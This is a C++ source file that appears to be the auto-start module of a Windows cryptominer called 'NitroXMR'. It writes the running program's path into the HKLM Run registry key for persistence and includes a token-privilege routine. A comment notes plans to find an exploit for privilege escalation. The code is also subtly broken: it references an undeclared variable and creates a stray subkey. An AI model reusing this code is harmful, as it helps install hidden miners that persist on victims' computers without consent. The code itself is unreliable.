#include "stdafx.h"
#include "autoRun.h"

// executePath

//提权的问题找找exp吧

BOOL autoRun()
{
	//CRegKey reg;        //定义注册表对象

	//
	//if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
	//{
	//	MessageBox(NULL, L"create!", L"info", MB_OK);
	//}

	//if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
	//{
	//	MessageBox(NULL, L"backup!", L"info", MB_OK);
	//}
	//
	//if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	//{

	//	MessageBox(NULL, L"key in", L"info", MB_OK);

	//	reg.Close();
	//}
	//else
	//{
	//	MessageBox(NULL, L"failed", L"info", MB_OK);
	//}

	
	return TRUE;
}

BOOL editReg()
{
	CString exePath;
	CRegKey reg;        //定义注册表对象

						//HKEY hK;
						//RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
						//	0, KEY_WRITE | KEY_READ, &hK);
						//printf("%d\n", hK);
						//RegCloseKey(hK);

						//这里竟然自动到了Software\\WOW6432node\\Microsoft\\Windows\\CurrentVersion\\Run
						//折腾了半天就是说怎么打得开写的入就是没有!!!!!!F**K
						//都上atl了,不过也挺好用

	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
	{

		HKEY hKey = reg.m_hKey;

		if (ERROR_SUCCESS == reg.Create(hKey, L"Test", REG_NONE))
		{
			printf("%d\n", reg.m_hKey);

			//应该传入随机名称这里先代替掉
			GetModuleFileName(NULL, executePath, MAX_PATH);

			reg.SetStringValue(L"NitroXMR", executePath);

			MessageBox(NULL, L"key in", L"info", NULL);

		}
		reg.Close();
		return TRUE;
	}
	return FALSE;
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) == 0)
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return TRUE;
}
